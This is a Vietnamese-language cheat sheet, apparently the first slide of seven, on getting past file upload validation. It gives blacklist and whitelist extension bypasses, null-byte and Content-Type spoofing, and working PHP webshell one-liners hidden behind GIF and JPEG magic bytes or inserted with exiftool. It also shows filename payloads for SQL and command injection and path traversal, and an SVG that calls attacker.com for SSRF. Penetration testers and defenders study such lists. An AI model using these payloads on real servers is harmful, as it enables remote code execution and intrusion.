
---

### 1/7

**File Upload - Tải lên tệp**
**Tác giả: Shubham Rooter**

#### Tác động của các định dạng tệp tải lên:

* ASP, ASPX, PHP5, PHP, PHP3: Có thể tải lên webshell, thực thi lệnh từ xa (RCE)
* SVG: Lưu trữ XSS, SSRF, XXE
* GIF: Lưu trữ XSS, SSRF
* CSV: Injection CSV
* XML: XXE
* AVI: LFI, SSRF
* HTML, JS: Injection HTML, XSS, Open redirect
* PNG, JPEG: Tấn công làm tràn pixel (DoS)
* ZIP: RCE qua LFI, DoS
* PDF, PPTX: SSRF, BLIND XXE

---

### Cách bypass (bỏ qua) kiểm tra tải lên:

**1. Bypass blacklist (danh sách đen):**

* PHP: đổi đuôi thành .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc
* ASP: asp, .aspx, .cer, .asa
* JSP: .jsp, .jspx, .jsw, .jsv, .jspf
* Coldfusion: .cfm, .cfml, .cfc, .dbm
* Thay đổi chữ hoa/thường ngẫu nhiên: .pHp, .pHP5, .PhAr

**2. Bypass whitelist (danh sách trắng):**

* file.jpg.php
* file.php.jpg
* file.php.blah123jpg
* file.php%00.jpg
* file.php\x00.jpg (khi upload, đổi chữ D (44 hex) thành 00)
* file.php%00
* file.php%20
* file.php%0d%0a.jpg
* file.php.....
* file.php/
* file.php.\\
* file.php#.png
* file.
* .html

**3. Bypass kiểm tra Content-Type (loại nội dung):**

* Thay đổi header Content-Type của file.php từ application/x-php hoặc application/octet-stream thành image/png, image/gif, image/jpg

**4. Bypass nội dung shell:**

* Thêm chuỗi "GIF89a;" ở đầu shellcode (vì GIF89a là header của file GIF), giúp qua mặt kiểm tra nội dung. Ví dụ:
  `GIF89a; <?php system($_GET['cmd']); ?>`

---

### Bypass bằng Magic Number (Số ma thuật - định danh định dạng tệp):

* Magic Number là chuỗi byte đầu tiên giúp nhận dạng định dạng tệp mà không cần dựa vào phần mở rộng.
* Có thể dùng hex editor (ví dụ hexedit) để chỉnh sửa magic number.
* Ví dụ tạo tệp PHP với magic number của JPEG:

  ```
  echo -n -e '\xFF\xD8\xFF\xE0\n<?php system($_GET['cmd']); ?>' > shell.jpg.pHp
  ```
* Kiểm tra file với lệnh:

  ```
  file shell.jpg.pHp
  ```

  Kết quả có thể hiển thị là "JPEG image data" dù file thực chất là PHP.

---

### Cách xác định uploader kiểm tra gì: signature hay extension hay content-type?

* Thử đổi đuôi shell sang .jpg rồi upload, nếu không thành công, có thể uploader không kiểm tra đuôi file.
* Thử thay đổi Content-Type thành image/jpg mà file giữ nguyên, nếu vẫn fail thì chắc uploader kiểm tra signature (magic number).

---

### Bypass bằng comment trong file jpg:

* Với các trang kiểm tra ảnh dùng `php getimagesize()`, có thể chèn shellcode vào phần comment của ảnh, ví dụ dùng exiftool:

  ```
  exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
  mv file.jpg file.php.jpg
  ```
* Vì .jpg không phải định dạng thực thi, đổi đuôi để bypass kiểm tra đuôi.

---

### Các loại lỗ hổng liên quan:

* **Directory Traversal:**

  * Đặt tên file ../../etc/passwd/logo.png để truy cập file hệ thống
  * ../../../logo.png có thể đổi logo website

* **SQL Injection:**

  * Đặt tên file 'sleep(10).jpg hoặc sleep(10)-- -.jpg để gây delay trong SQL

* **Command Injection:**

  * Đặt tên file ; sleep 10; để thực thi lệnh shell

* **SSRF:**

  * Upload từ URL có thể bị lợi dụng lấy dữ liệu của người truy cập
  * SSRF qua file .svg (nhúng ảnh từ URL độc hại)

* **XXE:**

  * Upload .svg có khai báo ENTITY XML để đọc file hệ thống

---

### Ví dụ mã khai thác SSRF qua .svg:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
  <image height="200" width="200" xlink:href="https://attacker.com/picture.jpg" />
</svg>
```

---

### Một số thủ thuật tải lên file để bypass:

* Dùng đuôi kép: file.jpg.php, file.png.php5
* Dùng đuôi đảo ngược (do lỗi cấu hình Apache): file.php.jpg
* Dùng ký tự viết hoa/thường ngẫu nhiên
* Null byte (%00) trong tên file
* Dấu chấm nhiều lần ở cuối file
* Ký tự đặc biệt như dấu slash /, dấu , dấu #
* Thay đổi Content-Type nhiều lần trong header

---

### Tấn công DoS:

* Tạo ảnh có kích thước rất lớn để làm tràn bộ nhớ (Pixel flood)
* Tải file ZIP chứa PHP và gọi từ URL với kiểu zip\://path/file.zip#rce.php (Zip Slip)

---

### Công cụ hỗ trợ:

* Exiftool để chỉnh sửa metadata trong ảnh, nhúng shellcode vào phần comment.
* Hexedit để sửa magic number của file.

---


